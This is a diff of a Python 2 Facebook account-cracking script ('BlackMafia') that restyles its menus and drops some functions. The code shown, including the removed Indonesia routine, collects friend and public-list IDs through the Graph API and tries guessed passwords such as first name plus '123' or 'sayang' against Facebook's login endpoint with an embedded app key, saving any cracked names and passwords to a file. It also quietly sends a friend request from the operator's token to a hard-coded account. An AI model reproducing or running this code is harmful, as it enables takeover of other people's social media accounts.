@@ -86,7 +86,7 @@ def jalan(z):
         time.sleep(0.0003)
 
 
-logo = '\x1b[1;92mCoder   : \x1b[1;96mTech Qaiser       .......... \x1b[1;92mGithub  :\x1b[1;96mhttps://github.com/TechQaiser ............... \x1b[1;92mFacebook:\x1b[1;96mQaiser Abbas ................ \x1b[1;92mYoutube :\x1b[1;96mTech Qaiser ........ .. ........ \x1b[1;92mNote :\x1b[1;96mThis Is only For Educational Purpose .................. \x1b[1;92mNew Update :\x1b[1;96m Identity Problem Fixed 100% If You Login With Acces Token\x1b[1;94m-----------------------------------------------'
+logo = '\033[1;95m╭━━━╮\033[1;95m┃╭━╮┃\033[1;95m┃┃╱┃┣━━┳┳━━┳━━┳━╮\033[1;95m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯\033[1;95m┃╰━╯┃╭╮┃┣━━┃┃━┫┃\033[1;95m╰━━╮┣╯╰┻┻━━┻━━┻╯\033[1;95m╱╱╱╰╯\033[1;94m-----------------------------------------------\033[1;92mCoder   :\033[1;96mTech Qaiser\033[1;92mGithub  :\033[1;96mhttps://github.com/TechQaiser\033[1;92mFacebook:\033[1;96mQaiser Abbas\033[1;92mYoutube :\033[1;96mTech Qaiser\033[1;92mNote :\033[1;96mThis Is only For Educational Purpose\033[1;92mNew Update :\033[1;96m Identity Problem Fixed 100% If You Login With Acces Token\033[1;94m-----------------------------------------------'
 back = 0
 threads = []
 berhasil = []
@@ -95,9 +95,8 @@ oks = []
 oke = []
 id = []
 os.system('clear')
-print '\n\x1b[1;96m================================= ' 
+print '\n\x1b[1;96m================================='
 os.system('clear')
-jalan('\x1b[1;96m------------------------------------')
 jalan('  \033[1;94m    ::::::::        :::     ::::::::::: ::::::::  :::::::::: ::::::::: ')
 jalan('  \033[1;94m :+:    :+:     :+: :+:       :+:    :+:    :+: :+:        :+:    :+: ')
 jalan('  \033[1;94m +:+    +:+    +:+   +:+      +:+    +:+        +:+        +:+    +:+  ')
@@ -110,33 +109,27 @@ jalan('                                contact me in fb Qaiser Abbas 🔒     ')
 def masuk():
     os.system('clear')
     print logo
-    print 36 * '\x1b[1;91m\xe2\x96\x93'
-    print '\x1b[1;97m{\x1b[1;92m01\x1b[1;97m} Login Token Facebook'
-    print '\x1b[1;97m{\x1b[1;92m02\x1b[1;97m} Download Token App'
-    print '\x1b[1;97m{\x1b[1;92m03\x1b[1;97m} Download Token App'
-    print '\x1b[1;97m{\x1b[1;92m04\x1b[1;97m} Login With Facebook'
-    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Exit'
-    print 36 * '\x1b[1;91m\xe2\x96\x93'
+    print 36 * '======================'
+    print '\033[1;95m 1 Login Token Facebook'
+    print '\033[1;95m 2 Login With Facebook'
+    print '\x1b[1;91m 0 Exit'
+    print 36 * '======================'
     pilih_masuk()
 
 
 def pilih_masuk():
-    msuk = raw_input('\x1b[1;90mSlect Options\x1b[91m:\x1b[1;92m ')
+    msuk = raw_input('\033[1;96mSlect Options\033[1;93m:\x1b[1;97m ')
     if msuk == '':
-        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Fill Correctly !'
+        print '\033[1;91mFill Correctly !'
         pilih_masuk()
-    elif msuk == '1' or msuk == '01':
+    elif msuk == '1' or msuk == '1':
         tokenz()
-    elif msuk == '2' or msuk == '02':
-        ambil_token()
-    elif msuk == '3' or msuk == '03':
-        ambil_link()
-    elif msuk == '4' or msuk == '04':
+    elif msuk == '2' or msuk == '2':
         login()
-    elif msuk == '0' or msuk == '00':
+    elif msuk == '0' or msuk == '0':
         keluar()
     else:
-        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Fill Correctly !'
+        print '\033[1;91mFill Correctly !'
         pilih_masuk()
 
 
@@ -144,39 +137,20 @@ def tokenz():
     os.system('clear')
     print logo
     print 36 * '\x1b[1;94m\xe2\x96\x93'
-    toket = raw_input('\x1b[1;97m{\x1b[1;95m?\x1b[1;97m} Token \x1b[1;91m:\x1b[1;92m ')
+    toket = raw_input('\033[1;31m Token \033[1;96m : \033[1;94m ')
     try:
         otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
         a = json.loads(otw.text)
         zedd = open('login.txt', 'w')
         zedd.write(toket)
         zedd.close()
-        print '\x1b[1;97m{\x1b[1;92m\xe2\x9c\x93\x1b[1;97m}\x1b[1;92m Login It works\xe2\x88\x9a'
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100042596717506')
+        print '\033[1;93m Sucessfully Logined '
+        os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
         bot_komen()
     except KeyError:
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} \x1b[1;91mToken wrong !'
+        print '\033[1;91m Token wrong '
         time.sleep(1.7)
         masuk()
-
-
-def ambil_token():
-    os.system('clear')
-    print logo
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
-    jalan('  \x1b[1;92m...BlackMafia Tool App...')
-    os.system('xdg-open https://drive.google.com/file/d/1O44l5Jz-_j4mqkuiYbXqGUXkdQq95fML/view?usp=drivesdk')
-    time.sleep(2)
-    masuk()
-
-
-def ambil_link():
-    print logo
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
-    jalan('  \x1b[1;92m.....Facebook Tooken App BlackMafia ...')
-    os.system('xdg-open https://drive.google.com/file/d/1O763J6DJIzoeGmm9G30gsNY3FIA0Jzyq/view?usp=drivesdk')
-    time.sleep(2)
-    masuk()
 
 
 def login():
@@ -187,20 +161,20 @@ def login():
     except (KeyError, IOError):
         os.system('clear')
         print logo
-        print 36 * '\x1b[1;94m\xe2\x96\x93'
-        jalan(' \x1b[1;93mWarning: \x1b[1;96mDo Not Use Your Personal Account')
-        jalan(' \x1b[1;93mWarning: \x1b[1;96mUse a New Account To Login')
-        jalan(' \x1b[1;93mWarning: \x1b[1;96mTermux  All version Work\xe2\x9c\x85')
-        print 36 * '\x1b[1;94m\xe2\x96\x93'
-        print '\x1b[1;97m\xe2\x96\xac\x1b[1;94m.....LOGIN WITH FACEBOOK.....\x1b[1;97m\xe2\x96\xac'
+        print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
+        jalan(' \033[1;91mWarning : \033[1;93mDo Not Use Your Personal Account')
+        jalan(' \033[1;91mDisclaimer : \033[1;93mThis Tool Is Only For Educational Purpose')
+        jalan(' \033[1;91mNote : \033[1;93m I am not Responsible For Any Miss Use ')
+        print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
+        print ' \033[1;95m Login Your Facebook Account'
         print '\t'
-        id = raw_input('\x1b[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')
-        pwd = raw_input('\x1b[1;97m[+] \x1b[1;94mPassword\x1b[1;97m: \x1b[1;94m')
+        id = raw_input('[+] \033[1;91mID/Email : \033[1;93m')
+        pwd = raw_input('[+] \033[1;91mPassword : \033[1;93m')
         menu()
         try:
             br.open('https://m.facebook.com')
         except mechanize.URLError:
-            print '\n\x1b[1;97mThere is no internet connection'
+            print '\033[1;91mThere is no internet connection'
             keluar()
 
         br._factory.is_html = True
@@ -223,21 +197,21 @@ def login():
                 unikers = open('login.txt', 'w')
                 unikers.write(z['access_token'])
                 unikers.close()
-                print '\n\x1b[1;96mLogin Successful.\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2..'
-                os.system('xdg-open https://www.facebook.com/profile.php?id=100042596717506')
+                print '\n\x1b[1;94mLogin Successfull'
+                os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 bot_komen()
             except requests.exceptions.ConnectionError:
-                print '\n\x1b[1;97mThere is no internet connection'
+                print '\033[1;91mThere is no internet connection'
                 keluar()
 
         if 'checkpoint' in url:
-            print '\n\x1b[1;97mYour Account is on Checkpoint'
+            print '\n\x1b[1;91mYour Account is in Checkpoint'
             os.system('rm -rf login.txt')
             time.sleep(1)
             keluar()
         else:
-            print '\n\x1b[1;94mPassword/Email is wrong'
+            print '\033[1;91mPassword/Email is wrong'
             os.system('rm -rf login.txt')
             time.sleep(1)
             masuk()
@@ -247,7 +221,7 @@ def bot_komen():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;97m[!] Token invalid'
+        print '\033[1;91m[!] Token invalid'
         os.system('rm -rf login.txt')
 
     una = '100013185071041'
@@ -270,7 +244,7 @@ def menu():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '{!} Token Invalid !'
+        print '\033[1;91m{!} Token Invalid !'
         os.system('clear')
         os.system('rm -rf login.txt')
         masuk()
@@ -282,36 +256,35 @@ def menu():
         id = a['id']
     except KeyError:
         os.system('clear')
-        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
+        print '\x1b[1;91m[!] \x1b[1;91mToken invalid'
         os.system('rm -rf login.txt')
         time.sleep(1)
         masuk()
         time.sleep(1)
         masuk()
     except requests.exceptions.ConnectionError:
-        print '{!} No connection'
+        print '\033[1;91m{!} No connection'
         keluar()
 
     os.system('clear')
     print logo
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
-    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m NAMA\x1b[1;90m    =>\x1b[1;92m ' + nama
-    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m USER ID\x1b[1;90m =>\x1b[1;92m ' + id
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
-    print '\x1b[1;97m{' + warni + '01\x1b[1;97m}' + warna + ' Crack ID Friend/Public'
-    print '\x1b[1;97m{' + warni + '02\x1b[1;97m}' + warna + ' Crack ID From Group / Friend Posts'
-    print '\x1b[1;97m{' + warni + '03\x1b[1;97m}' + warna + ' Crack ID From Total Followers'
-    print '\x1b[1;97m{' + warni + '04\x1b[1;97m}' + warna + ' Crack ID Using a Username'
-    print '\x1b[1;97m{' + warni + '05\x1b[1;97m}' + warna + ' Update Script'
-    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}' + warna + ' Back'
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
+    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
+    print '\033[1;33m NAME\x1b[1;95m    =>\x1b[1;92m ' + nama
+    print '\033[1;33m USER ID\x1b[1;95m =>\x1b[1;92m ' + id
+    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
+    print '\033[1;96m{' + warni + '01\033[1;92m}' + warna + ' Crack ID Friend/Public'
+    print '\033[1;96m{' + warni + '02\033[1;92m}' + warna + ' Crack ID From Group / Friend Posts'
+    print '\033[1;96m{' + warni + '03\033[1;92m}' + warna + ' Crack ID From Followers'
+    print '\033[1;96m{' + warni + '04\033[1;92m}' + warna + ' Crack ID Using a Username'
+    print '\033[1;96m{\x1b[1;91m00\033[1;92m}' + warna + ' Back'
+    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
     pilih()
 
 
 def pilih():
-    unikers = raw_input('\x1b[1;92mSlect Options \x1b[91m:\x1b[1;92m ')
+    unikers = raw_input('\x1b[1;92mSlect Options \x1b[91m:\x1b[1;96m ')
     if unikers == '':
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m  Fill Correctly!'
+        print '\x1b[1;91m{\x1b[1;91m!\x1b[1;91m}\x1b[1;91m  Fill Correctly!'
         pilih()
     elif unikers == '1' or unikers == '01':
         crack_teman()
@@ -321,352 +294,44 @@ def pilih():
         crack_follow()
     elif unikers == '4' or unikers == '04':
         user_id()
-    elif unikers == '5' or unikers == '05':
-        perbarui()
     elif unikers == '0' or unikers == '00':
         os.system('clear')
         jalan('Remove token')
         os.system('rm -rf login.txt')
         keluar()
     else:
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Fill Correctly !'
+        print '\x1b[1;91m{\x1b[1;91m!\x1b[1;91m}\x1b[1;91m Fill Correctly !'
         pilih()
 
 
 def crack_teman():
     os.system('clear')
     print logo
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
-    print '\x1b[1;97m{' + warna + '01\x1b[1;97m}' + warni + ' Crack ID Indonesia'
-    print '\x1b[1;97m{' + warna + '02\x1b[1;97m}' + warni + ' Crack ID Bangladesh'
-    print '\x1b[1;97m{' + warna + '03\x1b[1;97m}' + warni + ' Crack ID USA'
-    print '\x1b[1;97m{' + warna + '04\x1b[1;97m}' + warni + ' Crack ID Pakistan'
-    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}' + warni + ' Back'
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
+    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
+    print '\033[1;92m{' + warna + '01\x1b[1;97m}' + warni + ' Crack ID Bangladesh'
+    print '\033[1;92m{' + warna + '02\x1b[1;97m}' + warni + ' Crack ID Pakistan'
+    print '\033[1;91m00\033[1;92m}' + warni + ' Back'
+    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
     pilih_teman()
 
 
 def pilih_teman():
-    univ = raw_input('' + warna + 'Slect Options\x1b[91m:\x1b[1;92m ')
+    univ = raw_input('' + warna + 'Slect Options\033[91m : \033[1;96m ')
     if univ == '':
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Fill Correctly !'
+        print '\033[1;91mFill Correctly !'
         pilih_teman()
-    elif univ == '1' or univ == '01':
-        crack_indo()
-    elif univ == '2' or univ == '02':
+    elif univ == '1' or univ == '02':
         crack_bangla()
-    elif univ == '3' or univ == '03':
-        crack_usa()
-    elif univ == '4' or univ == '04':
+    elif univ == '2' or univ == '04':
         crack_pakis()
     elif univ == '5' or univ == '05':
         univ()
     elif univ == '0' or univ == '00':
         menu()
     else:
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Fill Correctly !'
+        print '\033[1;91m Fill Correctly !'
         pilih_teman()
 
-
-def crack_indo():
-    global toket
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r').read()
-    except IOError:
-        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
-        os.system('rm -rf login.txt')
-        time.sleep(1)
-        keluar()
-
-    os.system('clear')
-    print logo
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
-    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} Crack From Friend list'
-    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} Crack From Public Frendlist'
-    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} Crack From File'
-    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Back'
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
-    pilih_indo()
-
-
-def pilih_indo():
-    global cekpoint
-    global oks
-    teak = raw_input('\x1b[1;93mSlect Options \x1b[91m:\x1b[1;92m ')
-    if teak == '':
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Fill Correctly !'
-        pilih_indo()
-    else:
-        if teak == '1' or teak == '01':
-            os.system('clear')
-            print logo
-            print 36 * '\x1b[1;94m\xe2\x96\x93'
-            print '             \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a \x1b[1;97mCRACK INDONESIA \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a'
-            print 36 * '\x1b[1;94m\xe2\x96\x93'
-            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
-            z = json.loads(r.text)
-            for s in z['data']:
-                id.append(s['id'])
-
-        elif teak == '2' or teak == '02':
-            os.system('clear')
-            print logo
-            print 50 * '\x1b[1;94m\xe2\x94\x80'
-            print '        \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a \x1b[1;97mCRACK INDONESIA \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a'
-            print 50 * '\x1b[1;94m\xe2\x94\x80'
-            idt = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mID Public/friend \x1b[1;91m:\x1b[1;92m ')
-            try:
-                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
-                sp = json.loads(pok.text)
-                print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m}\x1b[1;93m Nama \x1b[1;91m:\x1b[1;92m ' + sp['name']
-            except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public / friend does not exist !'
-                raw_input('\n\x1b[1;93m{\x1b[1;97m<Back>\x1b[1;93m}')
-                crack_indo()
-            except requests.exceptions.ConnectionError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} No connection!'
-                keluar()
-
-            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
-            z = json.loads(r.text)
-            for i in z['data']:
-                id.append(i['id'])
-
-        elif teak == '3' or teak == '03':
-            os.system('clear')
-            print logo
-            try:
-                print 50 * '\x1b[1;94m\xe2\x94\x80'
-                print '             \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
-                print 50 * '\x1b[1;94m\xe2\x94\x80'
-                idlist = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mNama File\x1b[1;91m :\x1b[1;92m ')
-                for line in open(idlist, 'r').readlines():
-                    id.append(line.strip())
-
-            except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File there is no ! '
-                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
-            except IOError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File there is no !'
-                raw_input('\n\x1b[1;93m{\x1b[1;97m<Back>\x1b[1;93m}')
-                crack_indo()
-
-        elif teak == '0' or teak == '00':
-            menu()
-        else:
-            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
-            pilih_indo()
-        print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
-        print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mStop then CTRL+Z'
-        titik = ['.   ', '..  ', '... ']
-        for o in titik:
-            print '\r\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mCrack starting ' + o,
-            sys.stdout.flush()
-            time.sleep(1)
-
-    print '\n\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mUse Airplane Mode If Nothing Is Working'
-    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
-
-    def main(arg):
-        zowe = arg
-        try:
-            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S \x1b[1;97m' + str(len(zowe)))))
-            sys.stdout.flush()
-            os.mkdir('done')
-        except OSError:
-            pass
-
-        try:
-            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
-            j = json.loads(an.text)
-            bos1 = j['first_name'].lower() + '123'
-            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-            ko = json.load(data)
-            if 'access_token' in ko:
-                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
-                oke = open('done/indo.txt', 'a')
-                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
-                oke.close()
-                oks.append(zowe)
-            elif 'www.facebook.com' in ko['error_msg']:
-                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
-                cek = open('done/indo.txt', 'a')
-                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
-                cek.close()
-                cekpoint.append(zowe)
-            else:
-                bos2 = j['first_name'].lower() + '1234'
-                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                ko = json.load(data)
-                if 'access_token' in ko:
-                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
-                    oke = open('done/indo.txt', 'a')
-                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
-                    oke.close()
-                    oks.append(zowe)
-                elif 'www.facebook.com' in ko['error_msg']:
-                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
-                    cek = open('done/indo.txt', 'a')
-                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
-                    cek.close()
-                    cekpoint.append(zowe)
-                else:
-                    bos3 = j['first_name'].lower() + '12345'
-                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                    ko = json.load(data)
-                    if 'access_token' in ko:
-                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
-                        oke = open('done/indo.txt', 'a')
-                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
-                        oke.close()
-                        oks.append(zowe)
-                    elif 'www.facebook.com' in ko['error_msg']:
-                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
-                        cek = open('done/indo.txt', 'a')
-                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
-                        cek.close()
-                        cekpoint.append(zowe)
-                    else:
-                        bos4 = 'sayang'
-                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                        ko = json.load(data)
-                        if 'access_token' in ko:
-                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
-                            oke = open('done/indo.txt', 'a')
-                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
-                            oke.close()
-                            oks.append(zowe)
-                        elif 'www.facebook.com' in ko['error_msg']:
-                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
-                            cek = open('done/indo.txt', 'a')
-                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
-                            cek.close()
-                            cekpoint.append(zowe)
-                        else:
-                            bos5 = 'bangsat'
-                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                            ko = json.load(data)
-                            if 'access_token' in ko:
-                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
-                                oke = open('done/indo.txt', 'a')
